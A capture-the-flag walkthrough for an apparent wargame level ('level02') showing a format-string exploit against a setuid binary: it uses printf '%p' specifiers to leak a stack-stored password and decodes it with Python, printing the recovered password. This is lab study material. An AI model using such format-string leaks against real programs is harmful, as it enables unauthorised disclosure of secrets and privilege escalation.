Level02 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
```

Level02 rights:
```Shell
-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
```

The program ask for a username and a password:
```Shell
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: name
--[ Password: pass
*****************************************
name does not have access!
```

Decompiling with Hex-Rays on https://dogbolt.org/ shows four things:
- the program open the password file and stores it in a buffer
- it store our input in two different buffer
- a format string attack is possible because the buffer storing the username input
is used as a format string by `printf()`.
- the comparison between the password and our input is performed over 40 bytes,
so we can deduce that this is the length of the password.
Since the program stores the password on the stack and that we know its length, we will exploit `printf()` to display it.

Our buffer is the 28th argument of printf
```Shell
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAAAAA %28$p
--[ Password: 
*****************************************
AAAAAAAA 0x4141414141414141 does not have access!
```

Using Gdb we see three memory allocation:
- the first one of 112 bytes (0x70)
- the second one of 48 bytes (0xa0 - 0x70)
- the third one of 112 bytes (0x110 - 0xa0)
```Shell
(gdb) disas main
[...]
   0x000000000040082c <+24>:    lea    -0x70(%rbp),%rdx
[...]
   0x0000000000400849 <+53>:    lea    -0xa0(%rbp),%rdx
[...]
   0x0000000000400869 <+85>:    lea    -0x110(%rbp),%rdx
[...]
 ```
This corresponds to the three buffer, the buffer of 48 bytes is used to store the password.
Thanks to the disassemble code we know that the second buffer stores the password
and the third one retrieves the username input. There is an offset of 48 bytes beetween them.


Since each address is 8 bytes and that we use %p to print the password, the buffers are
separate by 6 (48 / 8) arguments, and we need to print 5 arguments (40 / 8) to display the entire password.

```Shell
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password: 
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```

Using a Python script, we will convert these five hexadecimal integers into 8-character
strings, reverse them due to little-endian format, and concatenate them to obtain the final password.
```Python
>>> hex_values = [
...     "756e505234376848",
...     "45414a3561733951",
...     "377a7143574e6758",
...     "354a35686e475873",
...     "48336750664b394d"
... ]
>>> 
>>> result = ''.join(
...     bytes.fromhex(h)[::-1].decode('ascii', errors='ignore') 
...     for h in hex_values
... )
>>> 
>>> print(result)
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```